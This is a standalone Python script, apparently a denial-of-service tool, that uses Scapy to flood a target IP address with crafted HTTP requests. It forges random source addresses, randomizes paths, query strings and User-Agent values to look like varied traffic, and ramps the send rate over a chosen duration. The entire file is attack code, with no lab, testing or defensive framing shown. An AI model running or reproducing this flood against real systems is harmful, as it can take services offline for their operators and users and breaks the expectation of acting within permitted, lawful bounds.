#!/usr/bin/env python3
import scapy.all as scapy
import random
import time
import sys
import string

paths = ["/", "/login", "/api/data", "/products", "/search", "/images/banner.jpg"]

def random_string(n=6):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(n))


def build_http_payload():
    method = random.choice(["GET", "POST"])
    path = random.choice(paths) + "?id=" + random_string()
    headers = [
        f"Host: example.com",
        f"User-Agent: Bot/{random.randint(1,10)}",
        f"Connection: {random.choice(['keep-alive','close'])}"
    ]
    body = ""
    if method == "POST":
        body = "data=" + random_string(20)
        headers.append(f"Content-Length: {len(body)}")

    payload = f"{method} {path} HTTP/1.1\r\n" + \
              "\r\n".join(headers) + "\r\n\r\n" + body

    return payload


def attack_profile(duration):
    start = time.time()
    while True:
        elapsed = time.time() - start
        if elapsed > duration:
            break
        phase = elapsed / duration
        yield 0.4 + (0.8 * phase)


def http_flood(target_ip, duration):

    base_rate = 20
    peak_rate = 500

    for intensity in attack_profile(duration):

        current_rate = base_rate + (peak_rate - base_rate) * intensity

        pkt = (
            scapy.IP(src=f"192.168.{random.randint(1,50)}.{random.randint(1,254)}", dst=target_ip) /
            scapy.TCP(
                sport=random.randint(1024, 65535),
                dport=80,
                flags="PA"
            ) /
            build_http_payload()
        )

        scapy.send(pkt, verbose=0)

        sleep_time = max(0.001, 1.0 / current_rate)
        sleep_time *= random.uniform(0.7, 1.3)
        time.sleep(sleep_time)


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: http_flood.py <target_ip> <duration>")
        sys.exit(1)

    http_flood(sys.argv[1], int(sys.argv[2]))